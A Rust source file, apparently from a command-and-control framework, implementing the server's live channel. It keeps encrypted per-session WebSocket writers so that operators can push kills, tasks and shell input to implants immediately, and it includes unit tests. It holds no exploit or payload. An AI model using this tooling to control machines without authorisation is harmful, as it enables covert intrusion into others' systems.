//! Server side of the live channel.
//!
//! A callback running on the WebSocket carrier holds one duplex connection. The
//! portal keeps a writer per connected session here, so an operator action — a
//! kill, a typed command, a keystroke in an attached shell — reaches the
//! implant in one round trip instead of waiting for its next beacon.
//!
//! Nothing here queues. If a session has no live connection the caller is told
//! so and can decide to fall back to the ordinary task queue; a push that
//! cannot be delivered is reported as an error rather than silently deferred,
//! because "stop this now" must never quietly become "stop this eventually".

use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};

use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{Live, LiveEvent},
};
use std::sync::Mutex;
use tokio::sync::mpsc::UnboundedSender;
use uuid::Uuid;

/// The write side of one live socket.
///
/// A sink pairs the frame queue with the signal that wakes the socket's own
/// task: the task is the only reader, so it can drain the queue whenever it is
/// told there is something in it, without anyone else holding the queue.
#[derive(Clone)]
pub struct LiveSink {
    frames: UnboundedSender<Vec<u8>>,
    wake: Arc<tokio::sync::Notify>,
}

impl LiveSink {
    pub fn new(frames: UnboundedSender<Vec<u8>>, wake: Arc<tokio::sync::Notify>) -> Self {
        Self { frames, wake }
    }

    fn write(&self, frame: Vec<u8>) -> Result<(), LiveError> {
        self.frames
            .send(frame)
            .map_err(|_| LiveError::NotConnected)?;
        self.wake.notify_one();
        Ok(())
    }
}

#[derive(Clone)]
struct LiveSocket {
    /// Identifies one connection, so a late close cannot remove a newer socket.
    connection: u64,
    sink: LiveSink,
}

/// A live socket the caller may detach later.
///
/// Handed back by [`LiveRegistry::attach`] because the only safe way to forget a
/// socket is to name the one you registered: a reconnect can replace the writer
/// while the previous connection's task is still unwinding.
pub struct LiveConnection {
    pub session_id: Uuid,
    connection: u64,
    /// Held so the socket stays reachable while the task that owns it unwinds.
    _sink: LiveSink,
}

/// The live connections currently established, keyed by session id.
#[derive(Clone, Default)]
pub struct LiveRegistry {
    sockets: Arc<Mutex<HashMap<Uuid, LiveSocket>>>,
}

impl LiveRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Record the write side of a session's open socket.
    pub fn attach(&self, session_id: Uuid, sink: LiveSink) -> LiveConnection {
        static NEXT: AtomicU64 = AtomicU64::new(1);
        let connection = NEXT.fetch_add(1, Ordering::Relaxed);
        self.sockets.lock().expect("live registry poisoned").insert(
            session_id,
            LiveSocket {
                connection,
                sink: sink.clone(),
            },
        );
        LiveConnection {
            session_id,
            connection,
            _sink: sink,
        }
    }

    /// Forget a session's socket, but only if it is still the one being closed.
    pub fn detach(&self, connection: &LiveConnection) {
        let mut sockets = self.sockets.lock().expect("live registry poisoned");
        if sockets
            .get(&connection.session_id)
            .is_some_and(|socket| socket.connection == connection.connection)
        {
            sockets.remove(&connection.session_id);
        }
    }

    pub fn is_live(&self, session_id: Uuid) -> bool {
        self.sockets
            .lock()
            .expect("live registry poisoned")
            .contains_key(&session_id)
    }

    pub fn live_sessions(&self) -> Vec<Uuid> {
        let mut ids: Vec<Uuid> = self
            .sockets
            .lock()
            .expect("live registry poisoned")
            .keys()
            .copied()
            .collect();
        ids.sort_unstable();
        ids
    }

    /// Seal `live` under the session key and write it to the socket.
    pub async fn push(
        &self,
        key: &[u8; crypto::KEY_LEN],
        session_id: Uuid,
        live: Live,
    ) -> Result<(), LiveError> {
        let plaintext =
            serde_json::to_vec(&live).map_err(|error| LiveError::Encode(error.to_string()))?;
        // Envelope ids only need to be unique within a session for AEAD
        // nonce hygiene; a monotonic counter per process is enough because the
        // key itself is per-session.
        let id = next_envelope_id();
        let encrypted = crypto::encrypt(key, id, &plaintext)
            .map_err(|error| LiveError::Encode(error.to_string()))?;
        let envelope = Envelope::new(Kind::Push, id, Some(session_id), encrypted);
        let sealed = envelope
            .seal(key)
            .map_err(|error| LiveError::Encode(error.to_string()))?;
        self.write(session_id, sealed.into_bytes())
    }

    fn write(&self, session_id: Uuid, frame: Vec<u8>) -> Result<(), LiveError> {
        let sink = {
            let sockets = self.sockets.lock().expect("live registry poisoned");
            sockets
                .get(&session_id)
                .map(|socket| socket.sink.clone())
                .ok_or(LiveError::NotConnected)?
        };
        // Send outside the lock: writing must not block anything else that is
        // registering or closing a socket.
        sink.write(frame)
    }
}

/// Read one live-channel frame the implant sent unprompted.
///
/// Returns `None` for anything that is not a `Kind::Event` frame addressed to
/// this session, so a misrouted frame can never be mistaken for shell output.
pub fn open_event(
    key: &[u8; crypto::KEY_LEN],
    session_id: Uuid,
    sealed: &[u8],
) -> Option<LiveEvent> {
    let wire = std::str::from_utf8(sealed).ok()?;
    let envelope = Envelope::open(key, wire).ok()?;
    if envelope.kind != Kind::Event || envelope.session_id != Some(session_id) {
        return None;
    }
    let plaintext = crypto::decrypt(key, envelope.id, &envelope.encrypted).ok()?;
    serde_json::from_slice(&plaintext).ok()
}

#[derive(Debug, thiserror::Error)]
pub enum LiveError {
    #[error("callback has no live connection; use the task queue")]
    NotConnected,
    #[error("could not encode live frame: {0}")]
    Encode(String),
}

fn next_envelope_id() -> u64 {
    static COUNTER: AtomicU64 = AtomicU64::new(1);
    COUNTER.fetch_add(1, Ordering::Relaxed)
}

#[cfg(test)]
mod tests {
    use super::*;
    use nw_profile::msgs::Task;

    use tokio::sync::mpsc::UnboundedReceiver;

    fn registry_with_session() -> (LiveRegistry, Uuid, UnboundedReceiver<Vec<u8>>) {
        let registry = LiveRegistry::new();
        let session = Uuid::new_v4();
        let (tx, rx) = tokio::sync::mpsc::unbounded_channel();
        registry.attach(
            session,
            LiveSink::new(tx, Arc::new(tokio::sync::Notify::new())),
        );
        (registry, session, rx)
    }

    /// A reconnect replaces the socket; the old task closing afterwards must not
    /// take the new one down with it.
    #[tokio::test]
    async fn detaching_an_old_connection_keeps_the_replacement() {
        let registry = LiveRegistry::new();
        let session = Uuid::new_v4();
        let (old_tx, _old_rx) = tokio::sync::mpsc::unbounded_channel();
        let (new_tx, _new_rx) = tokio::sync::mpsc::unbounded_channel();
        let old = registry.attach(
            session,
            LiveSink::new(old_tx, Arc::new(tokio::sync::Notify::new())),
        );
        let current = registry.attach(
            session,
            LiveSink::new(new_tx, Arc::new(tokio::sync::Notify::new())),
        );

        registry.detach(&old);
        assert!(
            registry.is_live(session),
            "the replacement socket must survive the old one closing"
        );
        registry.detach(&current);
        assert!(!registry.is_live(session));
    }

    #[tokio::test]
    async fn pushed_kill_arrives_without_any_beacon() {
        let (registry, session, mut rx) = registry_with_session();
        let key = [7u8; crypto::KEY_LEN];
        let victim = Uuid::new_v4();

        registry
            .push(&key, session, Live::Kill { task_id: victim })
            .await
            .expect("kill is pushed");

        let sealed = rx.recv().await.expect("a frame is waiting");
        let envelope = Envelope::open(&key, std::str::from_utf8(&sealed).unwrap()).unwrap();
        assert_eq!(envelope.kind, Kind::Push);
        assert_eq!(envelope.session_id, Some(session));
        let plaintext = crypto::decrypt(&key, envelope.id, &envelope.encrypted).unwrap();
        assert_eq!(
            serde_json::from_slice::<Live>(&plaintext).unwrap(),
            Live::Kill { task_id: victim }
        );
    }

    #[tokio::test]
    async fn push_to_a_session_without_a_socket_is_an_error_not_a_queue() {
        let registry = LiveRegistry::new();
        let key = [3u8; crypto::KEY_LEN];
        let outcome = registry
            .push(
                &key,
                Uuid::new_v4(),
                Live::ShellClose {
                    shell_id: Uuid::new_v4(),
                },
            )
            .await;
        assert!(matches!(outcome, Err(LiveError::NotConnected)));
    }

    #[tokio::test]
    async fn implant_events_are_decoded_only_for_their_own_session() {
        let key = [9u8; crypto::KEY_LEN];
        let session = Uuid::new_v4();
        let shell = Uuid::new_v4();
        let id = 5u64;
        let plaintext = serde_json::to_vec(&LiveEvent::ShellData {
            shell_id: shell,
            data: "aGk=".into(),
            stderr: false,
        })
        .unwrap();
        let sealed = Envelope::new(
            Kind::Event,
            id,
            Some(session),
            crypto::encrypt(&key, id, &plaintext).unwrap(),
        )
        .seal(&key)
        .unwrap();

        assert!(matches!(
            open_event(&key, session, sealed.as_bytes()),
            Some(LiveEvent::ShellData { .. })
        ));
        // Another session's frame must not be readable through this key.
        assert!(open_event(&key, Uuid::new_v4(), sealed.as_bytes()).is_none());
    }

    #[tokio::test]
    async fn a_pushed_task_matches_the_polled_wire_shape() {
        let (registry, session, mut rx) = registry_with_session();
        let key = [1u8; crypto::KEY_LEN];
        let task = Task {
            id: Uuid::new_v4(),
            command: "id".into(),
            args: vec![],
            timeout_ms: 5_000,
        };
        registry
            .push(&key, session, Live::Task { task: task.clone() })
            .await
            .unwrap();
        let sealed = rx.recv().await.unwrap();
        let envelope = Envelope::open(&key, std::str::from_utf8(&sealed).unwrap()).unwrap();
        let plaintext = crypto::decrypt(&key, envelope.id, &envelope.encrypted).unwrap();
        assert_eq!(
            serde_json::from_slice::<Live>(&plaintext).unwrap(),
            Live::Task { task }
        );
    }
}
